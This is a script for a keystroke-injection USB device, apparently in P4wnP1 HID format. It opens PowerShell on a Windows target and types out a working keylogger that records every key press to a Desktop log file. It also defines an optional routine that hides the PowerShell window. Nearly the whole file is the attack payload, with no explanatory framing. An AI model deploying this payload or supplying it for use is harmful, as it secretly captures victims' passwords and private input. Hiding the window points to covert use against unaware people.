layout('us');
typingSpeed(0, 0)

waitLED(ANY, 1000);
startPS();
delay(500);
// hidePS();

type("$signatures = '[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate); [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType); [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'; $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru; $LogFilePath = [Environment]::GetFolderPath('Desktop')+'\\testing-log.txt'; $null = New-Item -Path $LogFilePath -ItemType File -Force; try { Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red; while ($true) { Start-Sleep -Milliseconds 10; for ($ascii = 9; $ascii -le 254; $ascii++) { $state = $API::GetAsyncKeyState($ascii); if ($state -eq -32767) { $null = [console]::CapsLock; $virtualKey = $API::MapVirtualKey($ascii, 3); $kbstate = New-Object Byte[] 256; $checkkbstate = $API::GetKeyboardState($kbstate); $mychar = New-Object -TypeName System.Text.StringBuilder; $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0); if ($success) {[System.IO.File]::AppendAllText($LogFilePath, $mychar, [System.Text.Encoding]::Unicode)}}}}} finally { notepad $LogFilePath }");
press("ENTER")

function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  press("ENTER");
}